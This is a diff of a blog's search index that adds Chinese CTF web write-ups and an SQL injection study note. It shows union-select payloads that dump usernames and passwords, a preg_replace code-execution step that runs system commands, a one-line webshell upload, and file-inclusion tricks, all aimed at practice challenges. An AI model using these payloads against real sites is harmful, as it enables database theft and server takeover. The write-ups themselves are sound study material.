@@ -287,6 +287,19 @@
       </categories>
   </entry>
   <entry>
+    <title>攻防世界</title>
+    <url>/2020/07/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
+    <content><![CDATA[<p>攻防</p>
+<a id="more"></a>
+<hr>
+<p><strong>**</strong>攻防世界**<br>1.<img data-src="https://img-blog.csdnimg.cn/20200708082834990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200708083159117.png" alt="在这里插入图片描述"><br><strong><em>WP</em></strong>：题目提示想想初始界面。一般的话初始界面的命名为index.php,这里可以试试。将1.php改为index.php.发现跳转的还是1.php.我们打开开发者模块选择网络模块再试一次。发现了flag.或者使用burp抓包查看回显也可以找到。<br><img data-src="https://img-blog.csdnimg.cn/20200708084057338.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200708084751184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.<img data-src="https://img-blog.csdnimg.cn/20200708084837551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">WP:这里提示我们robots.txt,我们可以在URL里输入试下。<br><img data-src="https://img-blog.csdnimg.cn/2020070808512427.png" alt="在这里插入图片描述">)<img data-src="https://img-blog.csdnimg.cn/20200708085319159.png" alt="在这里插入图片描述"><br>发现flag藏在fl0g.php,同样再次输入fl0g.php就可以找到flag.<br>3.<img data-src="https://img-blog.csdnimg.cn/20200708085905603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)WP:从题目看应该是文件包含。这里while语句过滤了php：<img data-src="https://img-blog.csdnimg.cn/20200708102725849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">但是这个过滤是可以使用大小写绕过。或者使用data://伪协议。<br><img data-src="https://img-blog.csdnimg.cn/20200708103625463.png" alt="在这里插入图片描述">)system():输出并返回最后一行shell结果。<br>exec():不输出直接返回。<br><img data-src="https://img-blog.csdnimg.cn/20200708104122611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)这里就可以看到flag存在的文件名称，在利用源码中show_source()函数就可以找到flag.<br>4.<img data-src="https://img-blog.csdnimg.cn/20200708104357840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)WP:根据题目提示砸门直接点击报表中心。<img data-src="https://img-blog.csdnimg.cn/20200708104453673.png" alt="在这里插入图片描述">点击确定没有任何变化，应该是没有写后端。观察url发现id比较奇怪直接用burp爆破id.发现当id为2333时他的length不同，直接修改id即可找到flag<br><img data-src="https://img-blog.csdnimg.cn/20200708105356131.png" alt="在这里插入图片描述">)5.<img data-src="https://img-blog.csdnimg.cn/20200708105446784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:这里我们打开题目后发现是个滑稽的表情，我们打开开发者界面发现<img data-src="https://img-blog.csdnimg.cn/2020070810555889.png" alt="在这里插入图片描述">咱们输入这个source.php.<br><img data-src="https://img-blog.csdnimg.cn/20200708105647775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">出现了代码。这个代码中除了source.php还有hint.php,再次输入发现<br><img data-src="https://img-blog.csdnimg.cn/20200708110545193.png" alt="在这里插入图片描述"><br>找到了flag存在的位置，再审查代码，这个代码的意思就是要让file存在并且还要是字符串还要过check函数。而在要过check函数就规定这个file要是$whitelist数组中的元素，还要是字符串。而且这个代码中还有截取<img data-src="https://img-blog.csdnimg.cn/20200708110209138.png" alt="在这里插入图片描述"><br>不能有问号，还要解码<img data-src="https://img-blog.csdnimg.cn/20200708110315139.png" alt="在这里插入图片描述"><br>接下来就是构造file的值就可找到flag.<img data-src="https://img-blog.csdnimg.cn/20200708110848839.png" alt="在这里插入图片描述"></p>
+<hr>
+]]></content>
+      <categories>
+        <category>攻防</category>
+      </categories>
+  </entry>
+  <entry>
     <title>攻防</title>
     <url>/2020/07/17/%E6%94%BB%E9%98%B2/</url>
     <content><![CDATA[<p>攻防</p>
@@ -300,24 +313,16 @@
       </categories>
   </entry>
   <entry>
-    <title>test</title>
-    <url>/2021/04/24/test/</url>
-    <content><![CDATA[<p>xxxx</p>
-<a id="more"></a>
-<hr>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxxxx</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>xxxx</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>攻防世界</title>
-    <url>/2020/07/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
+    <title>攻防世界4</title>
+    <url>/2020/08/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C4/</url>
     <content><![CDATA[<p>攻防</p>
 <a id="more"></a>
 <hr>
-<p><strong>**</strong>攻防世界**<br>1.<img data-src="https://img-blog.csdnimg.cn/20200708082834990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200708083159117.png" alt="在这里插入图片描述"><br><strong><em>WP</em></strong>：题目提示想想初始界面。一般的话初始界面的命名为index.php,这里可以试试。将1.php改为index.php.发现跳转的还是1.php.我们打开开发者模块选择网络模块再试一次。发现了flag.或者使用burp抓包查看回显也可以找到。<br><img data-src="https://img-blog.csdnimg.cn/20200708084057338.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200708084751184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.<img data-src="https://img-blog.csdnimg.cn/20200708084837551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">WP:这里提示我们robots.txt,我们可以在URL里输入试下。<br><img data-src="https://img-blog.csdnimg.cn/2020070808512427.png" alt="在这里插入图片描述">)<img data-src="https://img-blog.csdnimg.cn/20200708085319159.png" alt="在这里插入图片描述"><br>发现flag藏在fl0g.php,同样再次输入fl0g.php就可以找到flag.<br>3.<img data-src="https://img-blog.csdnimg.cn/20200708085905603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)WP:从题目看应该是文件包含。这里while语句过滤了php：<img data-src="https://img-blog.csdnimg.cn/20200708102725849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">但是这个过滤是可以使用大小写绕过。或者使用data://伪协议。<br><img data-src="https://img-blog.csdnimg.cn/20200708103625463.png" alt="在这里插入图片描述">)system():输出并返回最后一行shell结果。<br>exec():不输出直接返回。<br><img data-src="https://img-blog.csdnimg.cn/20200708104122611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)这里就可以看到flag存在的文件名称，在利用源码中show_source()函数就可以找到flag.<br>4.<img data-src="https://img-blog.csdnimg.cn/20200708104357840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)WP:根据题目提示砸门直接点击报表中心。<img data-src="https://img-blog.csdnimg.cn/20200708104453673.png" alt="在这里插入图片描述">点击确定没有任何变化，应该是没有写后端。观察url发现id比较奇怪直接用burp爆破id.发现当id为2333时他的length不同，直接修改id即可找到flag<br><img data-src="https://img-blog.csdnimg.cn/20200708105356131.png" alt="在这里插入图片描述">)5.<img data-src="https://img-blog.csdnimg.cn/20200708105446784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:这里我们打开题目后发现是个滑稽的表情，我们打开开发者界面发现<img data-src="https://img-blog.csdnimg.cn/2020070810555889.png" alt="在这里插入图片描述">咱们输入这个source.php.<br><img data-src="https://img-blog.csdnimg.cn/20200708105647775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">出现了代码。这个代码中除了source.php还有hint.php,再次输入发现<br><img data-src="https://img-blog.csdnimg.cn/20200708110545193.png" alt="在这里插入图片描述"><br>找到了flag存在的位置，再审查代码，这个代码的意思就是要让file存在并且还要是字符串还要过check函数。而在要过check函数就规定这个file要是$whitelist数组中的元素，还要是字符串。而且这个代码中还有截取<img data-src="https://img-blog.csdnimg.cn/20200708110209138.png" alt="在这里插入图片描述"><br>不能有问号，还要解码<img data-src="https://img-blog.csdnimg.cn/20200708110315139.png" alt="在这里插入图片描述"><br>接下来就是构造file的值就可找到flag.<img data-src="https://img-blog.csdnimg.cn/20200708110848839.png" alt="在这里插入图片描述"></p>
-<hr>
+<p><strong><em>1.flask模板下注入</em></strong><br><img data-src="https://img-blog.csdnimg.cn/20200731211712846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这里打开题目后的界面是这样的<br><img data-src="https://img-blog.csdnimg.cn/20200731205718771.png" alt="在这里插入图片描述"><br>整理后<br><img data-src="https://img-blog.csdnimg.cn/20200731205747620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：这里用了flask在/shrine/下的SSTI，这里对小括号进行了替换并且将config与self拉入了黑名单。<br>这里根据他给的代码咱们构造payload</p>
+
+<p>注：1.flask是python的web 框架。<br>2.处理URL到python函数映射关系的程序一般叫做路由(Router)<br>3.上面的payload利用了flask-ssti模板注入漏洞。<br>4.<a href="https://www.cnblogs.com/zaqzzz/p/10251892.html这个是关于这个模板注入的总结。">https://www.cnblogs.com/zaqzzz/p/10251892.html这个是关于这个模板注入的总结。</a><br><strong><em>2.文件包含漏洞</em></strong><br><img data-src="https://img-blog.csdnimg.cn/20200731212317461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731212331696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：题目已经给出了提示让让利用后门入侵系统，这里一系列的按钮只有设备维护可以打开<br><img data-src="https://img-blog.csdnimg.cn/20200731212555322.png" alt="在这里插入图片描述"><br>查看源码后发现<img data-src="https://img-blog.csdnimg.cn/20200731212804869.png" alt="在这里插入图片描述"><br>咱们试着输入<br><img data-src="https://img-blog.csdnimg.cn/20200731212836747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里咱们利用php伪协议中php://filter读取源码。发现<br><img data-src="https://img-blog.csdnimg.cn/20200731213049962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里将页面显示出来的用base64解密。<br><img data-src="https://img-blog.csdnimg.cn/202007312133193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里可以利用preg_replace漏洞，执行php语句。传入三个参数使用burp抓包修改传入的参数，使php代码执行。<br><img data-src="https://img-blog.csdnimg.cn/20200731214912537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现咱们测试的代码执行，接下来咱们使用system(“ls”)获取文件目录<br><img data-src="https://img-blog.csdnimg.cn/20200731215309708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来咱们使用system(“cd%20s3chahahaDir/flag%26%26+ls”)进入这个s3这个目录并且查看这个目录的文件。<br><img data-src="https://img-blog.csdnimg.cn/20200731215717611.png" alt="在这里插入图片描述"><br>发现目录下有个flag文件.继续查看得到flag.php.<br>3.<br><img data-src="https://img-blog.csdnimg.cn/2020073122120290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221412695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：咱们点击view-source查看下源码。<br><img data-src="https://img-blog.csdnimg.cn/20200731221513354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221535708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221549514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里发现咱们需要绕过isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== ‘1’ &amp;&amp; substr($_GET[id], -1) === ‘9’，<br>这里限制了id值需要为浮点型但是不完全等于1，还要为字符串要等于9.这里设置1和9之间加入任意字符就行。即可绕过。<br>在burp中咱们上传一句话木马<br><img data-src="https://img-blog.csdnimg.cn/20200731224325519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用webshell工具连接<br><img data-src="https://img-blog.csdnimg.cn/20200731224455496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag.<br>4.<img data-src="https://img-blog.csdnimg.cn/20200801105925269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801110021536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801110034466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:这里根据页面咱们先注册个账号。<br><img data-src="https://img-blog.csdnimg.cn/20200801110153755.png" alt="在这里插入图片描述"><br>这里注册成功后显示普通用户登录成功没什么用，说明咱们需要管理员登录。而登陆与注册页面没什么可利用的，发现还有个找回密码的页面先打开看看经过使用1’ or 1=1#测试发现该页面存在sql注入漏洞。<br><img data-src="https://img-blog.csdnimg.cn/20200801110919372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用union select测试那个字段可用。发现字段3可用<br><img data-src="https://img-blog.csdnimg.cn/20200801111935849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>)<br>使用1’union select 1,2，database（），4#发现查询数据库失败。换一条语句试试1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#发现<br><img data-src="https://img-blog.csdnimg.cn/20200801111814146.png" alt="在这里插入图片描述"><br>找到数据库后就是找表与列。<br>1’union select 1,2,(table_name),4 from information_schema.tables where table_schema=’cetc004’#<br><img data-src="https://img-blog.csdnimg.cn/20200801112328921.png" alt="在这里插入图片描述"><br>1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name = ‘user’#使用这个语句查询表单的列<br><img data-src="https://img-blog.csdnimg.cn/20200801112711933.png" alt="在这里插入图片描述"><br>这里只使用username与password两列。<br>1’union select 1,2,group_concat(username),4 from cetc004.user#<br>1’union select 1,2,group_concat(password),4 from cetc004.user#<br><img data-src="https://img-blog.csdnimg.cn/20200801113210591.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/2020080111325379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到了用户名和密码。<br>这里发现密码用MD5解密打不开，这里咱们重复注册一个管理员账号即可得到flag.<br>5.<img data-src="https://img-blog.csdnimg.cn/20200801114624474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801115242239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:试着输入上面给的域名发现没有任何回应。试着使用127.0.0.1发现<br><img data-src="https://img-blog.csdnimg.cn/20200801115419993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现执行的是ping命令。利用模糊测试发现字符超过0x7F的ASCII都会引发Django的报错。咱们输入%80<br><img data-src="https://img-blog.csdnimg.cn/20200801115807863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现报错信息。复制这段html后打开查看<br><img data-src="https://img-blog.csdnimg.cn/2020080112022260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这里面找到了绝对网址<br><img data-src="https://img-blog.csdnimg.cn/2020080112031853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来在url中输入?url=@+绝对网址即可得到flag.</p>
 ]]></content>
       <categories>
         <category>攻防</category>
@@ -338,19 +343,199 @@
       </categories>
   </entry>
   <entry>
-    <title>攻防世界4</title>
-    <url>/2020/08/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C4/</url>
-    <content><![CDATA[<p>攻防</p>
+    <title>sql注入学习</title>
+    <url>/2021/04/24/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>sql注入总结<br>sql算是接触的比较早的了，学习了之后也一直没有总结，今天就算是记录下</p>
 <a id="more"></a>
 <hr>
-<p><strong><em>1.flask模板下注入</em></strong><br><img data-src="https://img-blog.csdnimg.cn/20200731211712846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>这里打开题目后的界面是这样的<br><img data-src="https://img-blog.csdnimg.cn/20200731205718771.png" alt="在这里插入图片描述"><br>整理后<br><img data-src="https://img-blog.csdnimg.cn/20200731205747620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：这里用了flask在/shrine/下的SSTI，这里对小括号进行了替换并且将config与self拉入了黑名单。<br>这里根据他给的代码咱们构造payload</p>
+<p><strong><em>sql函数介绍</em></strong><br>   #增：insert into table values(‘列名’,’列名’,’列名’)<br>   #改：update table set 列名=’xxx’ where 条件<br>   #删：delete from table where 条件</p>
+<p><strong><em>关键字介绍</em></strong></p>
+<ul>
+<li>数据库信息关键字<table>
+<thead>
+<tr>
+<th align="center">关键字</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">@@version</td>
+<td align="center">查看数据库版本信息</td>
+</tr>
+<tr>
+<td align="center">@@basedir</td>
+<td align="center">查看数据库路径</td>
+</tr>
+<tr>
+<td align="center">database()</td>
+<td align="center">查看当前数据库</td>
+</tr>
+<tr>
+<td align="center">user()</td>
+<td align="center">查看数据库当前用户</td>
+</tr>
+<tr>
+<td align="center">@@version_compile_os</td>
+<td align="center">操作系统版本</td>
+</tr>
+</tbody></table>
+</li>
+<li>获取这些信息对我们后面的渗透有作用，毕竟信息越多，渗透成功的可能性越大。</li>
+</ul>
+<p><strong><em>函数介绍</em></strong></p>
+<ul>
+<li><p>一些注入时用到的函数</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">length()</td>
+<td align="center">判断字符长度</td>
+</tr>
+<tr>
+<td align="center">if(a,b,c)</td>
+<td align="center">如果a正确，则执行b否则执行c</td>
+</tr>
+<tr>
+<td align="center">concat</td>
+<td align="center">将多个字符串谅解为一个字符串，无符号</td>
+</tr>
+<tr>
+<td align="center">concat_ws</td>
+<td align="center">以特定符号链接字符串</td>
+</tr>
+<tr>
+<td align="center">group_concat</td>
+<td align="center">将产生同一分组的值连接起来</td>
+</tr>
+<tr>
+<td align="center">left(str,a)</td>
+<td align="center">从左侧截取字符串的前a位</td>
+</tr>
+<tr>
+<td align="center">substr(a,b,c)</td>
+<td align="center">从b位置开始截取a字符串的第c位</td>
+</tr>
+<tr>
+<td align="center">substring</td>
+<td align="center">同substr</td>
+</tr>
+<tr>
+<td align="center">mid(a from b for c)</td>
+<td align="center">同substr函数,如果‘,’被过滤，可以使用这种写法</td>
+</tr>
+<tr>
+<td align="center">ascii(str)</td>
+<td align="center">将某个字符转换为ascii值</td>
+</tr>
+<tr>
+<td align="center">ord(str)</td>
+<td align="center">同ascii函数</td>
+</tr>
+<tr>
+<td align="center">IFNULL(a,b)</td>
+<td align="center">第一个参数为NULL就返回b.</td>
+</tr>
+<tr>
+<td align="center">CAST(a as b)</td>
+<td align="center">将a转换为b类型，b不能为自己定义的类型</td>
+</tr>
+</tbody></table>
+<p>示例：</p>
+</li>
+<li><p>select concat(id,username,password) from user。  将user表中id,username,password连接起来输出。</p>
+</li>
+<li><p>group_concat常于group by使用，用于将group by产生的相同的分组联合起来，如select group_concat(id) from user group by name。就是将user表中相同人名的id值连接起来。在sql注入中，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">where</span> table_schema=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>
+<p>你可以使用group_concat将当前数据库中所有表单的名字输出。<br><strong><em>探测注入点</em></strong></p>
+</li>
+<li><p>1’ and 1=——‘<br><strong><em>基于报错的sql盲注</em></strong></p>
+<h1 id="count-floor-rand-group-by联合进行报错回显"><a href="#count-floor-rand-group-by联合进行报错回显" class="headerlink" title="count(),floor(),rand(),group by联合进行报错回显"></a>count(),floor(),rand(),group by联合进行报错回显</h1></li>
+<li><p>rand()函数随机返回0<del>1之间的一个随机数，rand(0)固定返回0，rand()*2就是返回0</del>2之间的随机数。</p>
+</li>
+<li><p>floor()函数返回括等于或小于括号值的最大整数,当floor与rand(0)*2结合就会产生一个数列011011。</p>
+</li>
+<li><p>count()用于计数<br>#报错原理：count()与group by结合起来，在进行计数时会先建立虚拟表，虚拟表有key代表主键，value代表数量。上面floor(rand(0)<em>2)产生了一个数列011011。rand函数在进行计数的时候会被多次计算,即插入key值不存在时会在计算一次floor(rand(0)</em>2),按照上面的数列，<br>第一次计算时为0,0不存在会插入虚拟表中,同时在进行计算一次，这时插入的就是key为1,value为1。在继续往下进行,这时就是第三<br>次计算，值为1，表中存在,直接插入，这时表中key为1 vallue为2。继续进行，rand进行第四次计算值为0,表中不存在，在计算一次，<br>值为1进行插入，但是已经存在1，key值不能重复,这时就会报错。<br>#简化的语句：</p>
